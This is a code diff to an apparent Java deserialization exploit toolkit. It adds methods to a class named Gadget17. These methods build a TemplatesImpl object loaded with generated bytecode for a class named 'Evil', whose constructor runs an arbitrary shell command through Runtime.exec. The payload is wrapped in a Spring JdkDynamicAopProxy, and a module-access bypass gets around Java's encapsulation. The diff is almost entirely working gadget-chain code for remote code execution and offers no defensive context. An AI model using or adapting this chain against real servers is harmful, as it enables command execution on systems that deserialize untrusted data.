@@ -7,6 +7,7 @@ import com.fasterxml.jackson.databind.node.POJONode;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
+import javassist.CtNewConstructor;
 import org.springframework.aop.framework.AdvisedSupport;
 import sun.reflect.ReflectionFactory;
 
@@ -148,6 +149,46 @@ public class Gadget17 {
         tHashMap1.put(o, null);
         tHashMap2.put(o, null);
         return hashtable;
+    }
+
+    public static Object getTemplatesImpl(byte[] bytes) throws Exception {
+        Object templates = Util17.createWithoutConstructor(Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"));
+        Object transformerFactoryImpl = Util17.createWithoutConstructor(Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl"));
+
+        ClassPool pool = ClassPool.getDefault();
+        byte[] foo = pool.makeClass("Foo").toBytecode();
+
+        Util17.setFieldValue(templates, "_name", "whatever");
+        Util17.setFieldValue(templates, "_sdom", new ThreadLocal());
+        Util17.setFieldValue(templates, "_tfactory", transformerFactoryImpl);
+        Util17.setFieldValue(templates, "_bytecodes",  new byte[][] {bytes, foo});
+
+        return getJdkDynamicAopProxy(templates);
+    }
+    public static Object getTemplatesImpl(String cmd) throws Exception{
+
+        // SecurityActions 里有 setAccessible 操作
+        UnsafeTools.bypassModule(Class.forName("javassist.util.proxy.SecurityActions"));
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.makeClass("Evil");
+        ctClass.addConstructor(
+                CtNewConstructor.make("public Evil() {"+
+                                "Runtime.getRuntime().exec(\"" + cmd + "\"); }"
+                        , ctClass)
+        );
+
+        byte[] bytecode = ctClass.toBytecode();
+        return getTemplatesImpl(bytecode);
+    }
+    private static Object getJdkDynamicAopProxy(Object templatesImpl) throws Exception{
+        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
+        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
+        cons.setAccessible(true);
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(templatesImpl);
+        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
+        return Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
     }
 
 }
